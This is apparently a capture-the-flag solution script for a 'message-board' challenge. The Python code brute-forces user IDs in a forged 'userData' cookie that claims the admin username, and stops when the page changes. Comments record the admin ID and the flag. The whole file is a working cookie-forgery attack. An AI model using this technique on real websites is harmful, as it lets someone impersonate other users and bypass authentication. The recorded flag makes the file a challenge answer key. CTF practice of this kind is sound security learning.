import requests
from requests.structures import CaseInsensitiveDict

url = "https://message-board.hsc.tf/"

headers = CaseInsensitiveDict()

for i in range(0, 999):
    print("userID = " + str(i) ) 
    headers["Cookie"] = "userData=j:%7B%22userID%22:%22" + str(i)+ "%22,%22username%22:%22admin%22%7D"
    resp = requests.get(url, headers=headers)
    page = resp.content.decode("utf-8")
    if page.find("no flag for you") != 1429:
        print(page)
        break

#admin userID is 768
#flag : flag{y4m_y4m_c00k13s}
